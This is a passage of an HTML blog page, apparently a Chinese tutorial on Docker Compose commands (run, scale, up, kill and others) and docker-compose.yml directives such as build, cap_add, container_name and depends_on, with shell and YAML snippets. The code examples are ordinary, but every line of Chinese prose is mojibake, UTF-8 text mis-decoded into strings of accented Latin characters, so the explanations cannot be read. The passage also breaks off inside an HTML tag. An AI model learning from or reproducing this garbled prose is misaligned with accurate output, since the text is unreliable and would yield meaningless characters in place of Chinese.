é™¤æ„å»ºè¿‡ç¨‹ä¸­çš„ä¸´æ—¶å®¹å™¨ã€‚</p></li><li><p>â€“no-cache æ„å»ºé•œåƒè¿‡ç¨‹ä¸­ä¸ä½¿ç”¨ cacheï¼ˆè¿™å°†åŠ é•¿æ„å»ºè¿‡ç¨‹ï¼‰ã€‚</p></li><li><p>â€“pull å§‹ç»ˆå°è¯•é€šè¿‡ pull æ¥è·å–æ›´æ–°ç‰ˆæœ¬çš„é•œåƒã€‚</p></li></ul><p><strong>config</strong></p><p>éªŒè¯ Compose æ–‡ä»¶æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œè‹¥æ­£ç¡®åˆ™æ˜¾ç¤ºé…ç½®ï¼Œè‹¥æ ¼å¼é”™è¯¯æ˜¾ç¤ºé”™è¯¯åŸå› </p><p><strong>down</strong></p><p>æ­¤å‘½ä»¤å°†ä¼šåœæ­¢ up å‘½ä»¤æ‰€å¯åŠ¨çš„å®¹å™¨ï¼Œå¹¶ç§»é™¤ç½‘ç»œ</p><p><strong>exec</strong></p><p>è¿›å…¥æŒ‡å®šçš„å®¹å™¨ã€‚</p><p><strong>help</strong></p><p>è·å¾—ä¸€ä¸ªå‘½ä»¤çš„å¸®åŠ©ã€‚</p><p><strong>images</strong></p><p>åˆ—å‡º Compose æ–‡ä»¶ä¸­åŒ…å«çš„é•œåƒã€‚</p><p><strong>kill</strong></p><p>æ ¼å¼ä¸º <code>docker-compose kill [options] [SERVICE...]</code>ã€‚</p><p>é€šè¿‡å‘é€ SIGKILL ä¿¡å·æ¥å¼ºåˆ¶åœæ­¢æœåŠ¡å®¹å™¨ã€‚</p><p>æ”¯æŒé€šè¿‡ -s å‚æ•°æ¥æŒ‡å®šå‘é€çš„ä¿¡å·ï¼Œä¾‹å¦‚é€šè¿‡å¦‚ä¸‹æŒ‡ä»¤å‘é€ SIGINT ä¿¡å·ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker-compose <span class="built_in">kill</span> -s SIGINT</span></span><br></pre></td></tr></table></figure><p><strong>logs</strong></p><p>æ ¼å¼ä¸º <code>docker-compose logs [options] [SERVICE...]</code>ã€‚</p><p>æŸ¥çœ‹æœåŠ¡å®¹å™¨çš„è¾“å‡ºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œdocker-compose å°†å¯¹ä¸åŒçš„æœåŠ¡è¾“å‡ºä½¿ç”¨ä¸åŒçš„é¢œè‰²æ¥åŒºåˆ†ã€‚å¯ä»¥é€šè¿‡ <code>--no-color</code> æ¥å…³é—­é¢œè‰²ã€‚</p><p>è¯¥å‘½ä»¤åœ¨è°ƒè¯•é—®é¢˜çš„æ—¶å€™ååˆ†æœ‰ç”¨ã€‚</p><p><strong>pause</strong></p><p>æ ¼å¼ä¸º <code>docker-compose pause [SERVICE...]</code>ã€‚</p><p>æš‚åœä¸€ä¸ªæœåŠ¡å®¹å™¨ã€‚</p><p><strong>port</strong></p><p>æ ¼å¼ä¸º <code>docker-compose port [options] SERVICE PRIVATE_PORT</code>ã€‚</p><p>æ‰“å°æŸä¸ªå®¹å™¨ç«¯å£æ‰€æ˜ å°„çš„å…¬å…±ç«¯å£ã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li><p>â€“protocol=proto æŒ‡å®šç«¯å£åè®®ï¼Œtcpï¼ˆé»˜è®¤å€¼ï¼‰æˆ–è€… udpã€‚</p></li><li><p>â€“index=index å¦‚æœåŒä¸€æœåŠ¡å­˜åœ¨å¤šä¸ªå®¹å™¨ï¼ŒæŒ‡å®šå‘½ä»¤å¯¹è±¡å®¹å™¨çš„åºå·ï¼ˆé»˜è®¤ä¸º 1ï¼‰ã€‚</p></li></ul><p><strong>ps</strong></p><p>æ ¼å¼ä¸º <code>docker-compose ps [options] [SERVICE...]</code>ã€‚</p><p>åˆ—å‡ºé¡¹ç›®ä¸­ç›®å‰çš„æ‰€æœ‰å®¹å™¨ã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li>-q åªæ‰“å°å®¹å™¨çš„ ID ä¿¡æ¯ã€‚</li></ul><p><strong>pull</strong></p><p>æ ¼å¼ä¸º <code>docker-compose pull [options] [SERVICE...]</code>ã€‚</p><p>æ‹‰å–æœåŠ¡ä¾èµ–çš„é•œåƒã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li>â€“ignore-pull-failures å¿½ç•¥æ‹‰å–é•œåƒè¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚</li></ul><p><strong>push</strong></p><p>æ¨é€æœåŠ¡ä¾èµ–çš„é•œåƒåˆ° Docker é•œåƒä»“åº“ã€‚</p><p><strong>restart</strong></p><p>æ ¼å¼ä¸º <code>docker-compose restart [options] [SERVICE...]</code>ã€‚</p><p>é‡å¯é¡¹ç›®ä¸­çš„æœåŠ¡ã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li>-t, â€“timeout TIMEOUT æŒ‡å®šé‡å¯å‰åœæ­¢å®¹å™¨çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚</li></ul><p><strong>rm</strong><br>æ ¼å¼ä¸º <code>docker-compose rm [options] [SERVICE...]</code>ã€‚</p><p>åˆ é™¤æ‰€æœ‰ï¼ˆåœæ­¢çŠ¶æ€çš„ï¼‰æœåŠ¡å®¹å™¨ã€‚æ¨èå…ˆæ‰§è¡Œ <code>docker-compose stop</code> å‘½ä»¤æ¥åœæ­¢å®¹å™¨ã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li><p>-f, â€“force å¼ºåˆ¶ç›´æ¥åˆ é™¤ï¼ŒåŒ…æ‹¬éåœæ­¢çŠ¶æ€çš„å®¹å™¨ã€‚ä¸€èˆ¬å°½é‡ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ã€‚</p></li><li><p>-v åˆ é™¤å®¹å™¨æ‰€æŒ‚è½½çš„æ•°æ®å·ã€‚</p></li></ul><p><strong>run</strong></p><p>æ ¼å¼ä¸º <code>docker-compose run [options] [-p PORT...] [-e KEY=VAL...] SERVICE [COMMAND] [ARGS...]</code>ã€‚</p><p>åœ¨æŒ‡å®šæœåŠ¡ä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose <span class="built_in">run</span> ubuntu <span class="built_in">ping</span> docker.com</span><br></pre></td></tr></table></figure><p>å°†ä¼šå¯åŠ¨ä¸€ä¸ª ubuntu æœåŠ¡å®¹å™¨ï¼Œå¹¶æ‰§è¡Œ ping docker.com å‘½ä»¤ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœå­˜åœ¨å…³è”ï¼Œåˆ™æ‰€æœ‰å…³è”çš„æœåŠ¡å°†ä¼šè‡ªåŠ¨è¢«å¯åŠ¨ï¼Œé™¤éè¿™äº›æœåŠ¡å·²ç»åœ¨è¿è¡Œä¸­ã€‚</p><p>è¯¥å‘½ä»¤ç±»ä¼¼å¯åŠ¨å®¹å™¨åè¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ï¼Œç›¸å…³å·ã€é“¾æ¥ç­‰ç­‰éƒ½å°†ä¼šæŒ‰ç…§é…ç½®è‡ªåŠ¨åˆ›å»ºã€‚</p><p>ä¸¤ä¸ªä¸åŒç‚¹ï¼š</p><p>ç»™å®šå‘½ä»¤å°†ä¼šè¦†ç›–åŸæœ‰çš„è‡ªåŠ¨è¿è¡Œå‘½ä»¤ï¼›</p><p>ä¸ä¼šè‡ªåŠ¨åˆ›å»ºç«¯å£ï¼Œä»¥é¿å…å†²çªã€‚</p><p>å¦‚æœä¸å¸Œæœ›è‡ªåŠ¨å¯åŠ¨å…³è”çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ <code>--no-deps</code> é€‰é¡¹ï¼Œä¾‹å¦‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose run --<span class="keyword">no</span>-deps web <span class="keyword">python</span> manage.<span class="keyword">py</span> <span class="keyword">shell</span></span><br></pre></td></tr></table></figure><p>å°†ä¸ä¼šå¯åŠ¨ web å®¹å™¨æ‰€å…³è”çš„å…¶å®ƒå®¹å™¨ã€‚</p><p>é€‰é¡¹ï¼š</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">d åå°è¿è¡Œå®¹å™¨ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--name NAME ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåå­—ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--entrypoint CMD è¦†ç›–é»˜è®¤çš„å®¹å™¨å¯åŠ¨æŒ‡ä»¤ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-e KEY=VAL è®¾ç½®ç¯å¢ƒå˜é‡å€¼ï¼Œå¯å¤šæ¬¡ä½¿ç”¨é€‰é¡¹æ¥è®¾ç½®å¤šä¸ªç¯å¢ƒå˜é‡ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-u, --user=<span class="string">""</span> æŒ‡å®šè¿è¡Œå®¹å™¨çš„ç”¨æˆ·åæˆ–è€… uidã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-deps ä¸è‡ªåŠ¨å¯åŠ¨å…³è”çš„æœåŠ¡å®¹å™¨ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--rm è¿è¡Œå‘½ä»¤åè‡ªåŠ¨åˆ é™¤å®¹å™¨ï¼Œd æ¨¡å¼ä¸‹å°†å¿½ç•¥ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-p, --publish=[] æ˜ å°„å®¹å™¨ç«¯å£åˆ°æœ¬åœ°ä¸»æœºã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--service-ports é…ç½®æœåŠ¡ç«¯å£å¹¶æ˜ å°„åˆ°æœ¬åœ°ä¸»æœºã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-T ä¸åˆ†é…ä¼ª ttyï¼Œæ„å‘³ç€ä¾èµ– tty çš„æŒ‡ä»¤å°†æ— æ³•è¿è¡Œã€‚</span></span><br></pre></td></tr></table></figure><p><strong>scale</strong></p><p>æ ¼å¼ä¸º <code>docker-compose scale [options] [SERVICE=NUM...]</code>ã€‚</p><p>è®¾ç½®æŒ‡å®šæœåŠ¡è¿è¡Œçš„å®¹å™¨ä¸ªæ•°ã€‚</p><p>é€šè¿‡ service=num çš„å‚æ•°æ¥è®¾ç½®æ•°é‡ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker-compose scale web=<span class="number">3</span> db=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>å°†å¯åŠ¨ 3 ä¸ªå®¹å™¨è¿è¡Œ web æœåŠ¡ï¼Œ2 ä¸ªå®¹å™¨è¿è¡Œ db æœåŠ¡ã€‚</p><p>ä¸€èˆ¬çš„ï¼Œå½“æŒ‡å®šæ•°ç›®å¤šäºè¯¥æœåŠ¡å½“å‰å®é™…è¿è¡Œå®¹å™¨ï¼Œå°†æ–°åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼›åä¹‹ï¼Œå°†åœæ­¢å®¹å™¨ã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li>-t, â€“timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚</li></ul><p><strong>start</strong></p><p>æ ¼å¼ä¸º <code>docker-compose start [SERVICE...]</code>ã€‚</p><p>å¯åŠ¨å·²ç»å­˜åœ¨çš„æœåŠ¡å®¹å™¨ã€‚</p><p><strong>stop</strong></p><p>æ ¼å¼ä¸º <code>docker-compose stop [options] [SERVICE...]</code>ã€‚</p><p>åœæ­¢å·²ç»å¤„äºè¿è¡ŒçŠ¶æ€çš„å®¹å™¨ï¼Œä½†ä¸åˆ é™¤å®ƒã€‚é€šè¿‡ docker-compose start å¯ä»¥å†æ¬¡å¯åŠ¨è¿™äº›å®¹å™¨ã€‚</p><p>é€‰é¡¹ï¼š</p><ul><li>-t, â€“timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º 10 ç§’ï¼‰ã€‚</li></ul><p><strong>top</strong></p><p>æŸ¥çœ‹å„ä¸ªæœåŠ¡å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹ã€‚</p><p><strong>unpause</strong></p><p>æ ¼å¼ä¸º <code>docker-compose unpause [SERVICE...]</code>ã€‚</p><p>æ¢å¤å¤„äºæš‚åœçŠ¶æ€ä¸­çš„æœåŠ¡ã€‚</p><p><strong>up</strong></p><p>æ ¼å¼ä¸º <code>docker-compose up [options] [SERVICE...]</code>ã€‚</p><p>è¯¥å‘½ä»¤ååˆ†å¼ºå¤§ï¼Œå®ƒå°†å°è¯•è‡ªåŠ¨å®ŒæˆåŒ…æ‹¬æ„å»ºé•œåƒï¼Œï¼ˆé‡æ–°ï¼‰åˆ›å»ºæœåŠ¡ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå¹¶å…³è”æœåŠ¡ç›¸å…³å®¹å™¨çš„ä¸€ç³»åˆ—æ“ä½œã€‚</p><p>é“¾æ¥çš„æœåŠ¡éƒ½å°†ä¼šè¢«è‡ªåŠ¨å¯åŠ¨ï¼Œé™¤éå·²ç»å¤„äºè¿è¡ŒçŠ¶æ€ã€‚</p><p>å¯ä»¥è¯´ï¼Œå¤§éƒ¨åˆ†æ—¶å€™éƒ½å¯ä»¥ç›´æ¥é€šè¿‡è¯¥å‘½ä»¤æ¥å¯åŠ¨ä¸€ä¸ªé¡¹ç›®ã€‚</p><p>é»˜è®¤æƒ…å†µï¼Œdocker-compose up å¯åŠ¨çš„å®¹å™¨éƒ½åœ¨å‰å°ï¼Œæ§åˆ¶å°å°†ä¼šåŒæ—¶æ‰“å°æ‰€æœ‰å®¹å™¨çš„è¾“å‡ºä¿¡æ¯ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿è¿›è¡Œè°ƒè¯•ã€‚</p><p>å½“é€šè¿‡ Ctrl-C åœæ­¢å‘½ä»¤æ—¶ï¼Œæ‰€æœ‰å®¹å™¨å°†ä¼šåœæ­¢ã€‚</p><p>å¦‚æœä½¿ç”¨ <code>docker-compose up -d</code>ï¼Œå°†ä¼šåœ¨åå°å¯åŠ¨å¹¶è¿è¡Œæ‰€æœ‰çš„å®¹å™¨ã€‚ä¸€èˆ¬æ¨èç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨è¯¥é€‰é¡¹ã€‚</p><p>é»˜è®¤æƒ…å†µï¼Œå¦‚æœæœåŠ¡å®¹å™¨å·²ç»å­˜åœ¨ï¼Œdocker-compose up å°†ä¼šå°è¯•åœæ­¢å®¹å™¨ï¼Œç„¶åé‡æ–°åˆ›å»ºï¼ˆä¿æŒä½¿ç”¨ volumes-from æŒ‚è½½çš„å·ï¼‰ï¼Œä»¥ä¿è¯æ–°å¯åŠ¨çš„æœåŠ¡åŒ¹é… docker-compose.yml æ–‡ä»¶çš„æœ€æ–°å†…å®¹ã€‚å¦‚æœç”¨æˆ·ä¸å¸Œæœ›å®¹å™¨è¢«åœæ­¢å¹¶é‡æ–°åˆ›å»ºï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up â€“no-recreateã€‚è¿™æ ·å°†åªä¼šå¯åŠ¨å¤„äºåœæ­¢çŠ¶æ€çš„å®¹å™¨ï¼Œè€Œå¿½ç•¥å·²ç»è¿è¡Œçš„æœåŠ¡ã€‚å¦‚æœç”¨æˆ·åªæƒ³é‡æ–°éƒ¨ç½²æŸä¸ªæœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ docker-compose up â€“no-deps -d &lt;SERVICE_NAME&gt; æ¥é‡æ–°åˆ›å»ºæœåŠ¡å¹¶åå°åœæ­¢æ—§æœåŠ¡ï¼Œå¯åŠ¨æ–°æœåŠ¡ï¼Œå¹¶ä¸ä¼šå½±å“åˆ°å…¶æ‰€ä¾èµ–çš„æœåŠ¡ã€‚</p><p>é€‰é¡¹ï¼š</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">d åœ¨åå°è¿è¡ŒæœåŠ¡å®¹å™¨ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-color ä¸ä½¿ç”¨é¢œè‰²æ¥åŒºåˆ†ä¸åŒçš„æœåŠ¡çš„æ§åˆ¶å°è¾“å‡ºã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-deps ä¸å¯åŠ¨æœåŠ¡æ‰€é“¾æ¥çš„å®¹å™¨ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--force-recreate å¼ºåˆ¶é‡æ–°åˆ›å»ºå®¹å™¨ï¼Œä¸èƒ½ä¸ --no-recreate åŒæ—¶ä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-recreate å¦‚æœå®¹å™¨å·²ç»å­˜åœ¨äº†ï¼Œåˆ™ä¸é‡æ–°åˆ›å»ºï¼Œä¸èƒ½ä¸ --force-recreate åŒæ—¶ä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">--no-build ä¸è‡ªåŠ¨æ„å»ºç¼ºå¤±çš„æœåŠ¡é•œåƒã€‚</span></span><br><span class="line"><span class="ruby"></span></span><br><span class="line"><span class="ruby">-t, --timeout TIMEOUT åœæ­¢å®¹å™¨æ—¶å€™çš„è¶…æ—¶ï¼ˆé»˜è®¤ä¸º <span class="number">10</span> ç§’ï¼‰ã€‚</span></span><br></pre></td></tr></table></figure><p><strong>version</strong></p><p>æ ¼å¼ä¸º <code>docker-compose version</code>ã€‚</p><p>æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚</p><h3 id="Composeæ¨¡æ¿æ–‡ä»¶"><a href="#Composeæ¨¡æ¿æ–‡ä»¶" class="headerlink" title="Composeæ¨¡æ¿æ–‡ä»¶"></a>Composeæ¨¡æ¿æ–‡ä»¶</h3><p>æ¨¡æ¿æ–‡ä»¶æ˜¯ä½¿ç”¨ <code>Compose</code> çš„æ ¸å¿ƒï¼Œæ¶‰åŠåˆ°çš„æŒ‡ä»¤å…³é”®å­—ä¹Ÿæ¯”è¾ƒå¤šã€‚ä½†å¤§å®¶ä¸ç”¨æ‹…å¿ƒï¼Œè¿™é‡Œé¢å¤§éƒ¨åˆ†æŒ‡ä»¤è·Ÿ <code>docker run</code> ç›¸å…³å‚æ•°çš„å«ä¹‰éƒ½æ˜¯ç±»ä¼¼çš„ã€‚</p><p>é»˜è®¤çš„æ¨¡æ¿æ–‡ä»¶åç§°ä¸º <code>docker-compose.yml</code>ï¼Œæ ¼å¼ä¸º YAML æ ¼å¼ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  webapp:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">examples/web</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80:80"</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"/data"</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ¯ä¸ªæœåŠ¡éƒ½å¿…é¡»é€šè¿‡ <code>image</code> æŒ‡ä»¤æŒ‡å®šé•œåƒæˆ– <code>build</code> æŒ‡ä»¤ï¼ˆéœ€è¦ Dockerfileï¼‰ç­‰æ¥è‡ªåŠ¨æ„å»ºç”Ÿæˆé•œåƒã€‚</p><p>å¦‚æœä½¿ç”¨ <code>build</code> æŒ‡ä»¤ï¼Œåœ¨ <code>Dockerfile</code> ä¸­è®¾ç½®çš„é€‰é¡¹(ä¾‹å¦‚ï¼š<code>CMD</code>, <code>EXPOSE</code>, <code>VOLUME</code>, <code>ENV</code> ç­‰) å°†ä¼šè‡ªåŠ¨è¢«è·å–ï¼Œæ— éœ€åœ¨ <code>docker-compose.yml</code> ä¸­å†æ¬¡è®¾ç½®ã€‚</p><p>ä¸‹é¢åˆ†åˆ«ä»‹ç»å„ä¸ªæŒ‡ä»¤çš„ç”¨æ³•ã€‚</p><p><code>build</code></p><p>æŒ‡å®š <code>Dockerfile</code> æ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼ˆå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ï¼Œæˆ–è€…ç›¸å¯¹ docker-compose.yml æ–‡ä»¶çš„è·¯å¾„ï¼‰ã€‚ <code>Compose</code> å°†ä¼šåˆ©ç”¨å®ƒè‡ªåŠ¨æ„å»ºè¿™ä¸ªé•œåƒï¼Œç„¶åä½¿ç”¨è¿™ä¸ªé•œåƒã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  webapp:</span></span><br><span class="line"><span class="attr">    build:</span> <span class="string">./dir</span></span><br></pre></td></tr></table></figure><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>context</code> æŒ‡ä»¤æŒ‡å®š <code>Dockerfile</code> æ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</p><p>ä½¿ç”¨ <code>dockerfile</code> æŒ‡ä»¤æŒ‡å®š <code>Dockerfile</code> æ–‡ä»¶åã€‚</p><p>ä½¿ç”¨ <code>arg</code> æŒ‡ä»¤æŒ‡å®šæ„å»ºé•œåƒæ—¶çš„å˜é‡ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">  webapp:</span></span><br><span class="line"><span class="attr">    build:</span></span><br><span class="line"><span class="attr">      context:</span> <span class="string">./dir</span></span><br><span class="line"><span class="attr">      dockerfile:</span> <span class="string">Dockerfile-alternate</span></span><br><span class="line"><span class="attr">      args:</span></span><br><span class="line"><span class="attr">        buildno:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>cache_from</code> æŒ‡å®šæ„å»ºé•œåƒçš„ç¼“å­˜</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span></span><br><span class="line"><span class="attr">  context:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">  cache_from:</span></span><br><span class="line"><span class="attr">    - alpine:</span><span class="string">latest</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">corp/web_app:3.14</span></span><br></pre></td></tr></table></figure><p><code>cap_add, cap_drop</code></p><p>æŒ‡å®šå®¹å™¨çš„å†…æ ¸èƒ½åŠ›ï¼ˆcapacityï¼‰åˆ†é…ã€‚</p><p>ä¾‹å¦‚ï¼Œè®©å®¹å™¨æ‹¥æœ‰æ‰€æœ‰èƒ½åŠ›å¯ä»¥æŒ‡å®šä¸ºï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cap_add:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">ALL</span></span><br></pre></td></tr></table></figure><p>å»æ‰ NET_ADMIN èƒ½åŠ›å¯ä»¥æŒ‡å®šä¸ºï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cap_drop:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">NET_ADMIN</span></span><br></pre></td></tr></table></figure><p><code>command</code></p><p>è¦†ç›–å®¹å™¨å¯åŠ¨åé»˜è®¤æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">command:</span> <span class="string">echo</span> <span class="string">"hello world"</span></span><br></pre></td></tr></table></figure><p><code>configs</code></p><p>ä»…ç”¨äº <code>Swarm mode</code>ï¼Œè¯¦ç»†å†…å®¹è¯·æŸ¥çœ‹ <a href="../swarm_mode/"><code>Swarm mode</code></a> ä¸€èŠ‚ã€‚</p><p><code>cgroup_parent</code></p><p>æŒ‡å®šçˆ¶ <code>cgroup</code> ç»„ï¼Œæ„å‘³ç€å°†ç»§æ‰¿è¯¥ç»„çš„èµ„æºé™åˆ¶ã€‚</p><p>ä¾‹å¦‚ï¼Œåˆ›å»ºäº†ä¸€ä¸ª cgroup ç»„åç§°ä¸º <code>cgroups_1</code>ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cgroup_parent:</span> <span class="string">cgroups_1</span></span><br></pre></td></tr></table></figure><p><code>container_name</code></p><p>æŒ‡å®šå®¹å™¨åç§°ã€‚é»˜è®¤å°†ä¼šä½¿ç”¨ <code>é¡¹ç›®åç§°_æœåŠ¡åç§°_åºå·</code> è¿™æ ·çš„æ ¼å¼ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">container_name:</span> <span class="string">docker-web-container</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„: æŒ‡å®šå®¹å™¨åç§°åï¼Œè¯¥æœåŠ¡å°†æ— æ³•è¿›è¡Œæ‰©å±•ï¼ˆscaleï¼‰ï¼Œå› ä¸º Docker ä¸å…è®¸å¤šä¸ªå®¹å™¨å…·æœ‰ç›¸åŒçš„åç§°ã€‚</p></blockquote><p><code>deploy</code></p><p>ä»…ç”¨äº <code>Swarm mode</code>ï¼Œè¯¦ç»†å†…å®¹è¯·æŸ¥çœ‹ <a href="../swarm_mode/"><code>Swarm mode</code></a> ä¸€èŠ‚</p><p><code>devices</code></p><p>æŒ‡å®šè®¾å¤‡æ˜ å°„å…³ç³»ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">devices:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">"/dev/ttyUSB1:/dev/ttyUSB0"</span></span><br></pre></td></tr></table></figure><p><code>depends_on</code></p><p>è§£å†³å®¹å™¨çš„ä¾èµ–ã€å¯åŠ¨å…ˆåçš„é—®é¢˜ã€‚ä»¥ä¸‹ä¾‹å­ä¸­ä¼šå…ˆå¯åŠ¨ <code>redis</code> <code>db</code> å†å¯åŠ¨ <code>web</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  web:</span></span><br><span class="line"><span class="attr">    build:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">    depends_on:</span></span><br><span 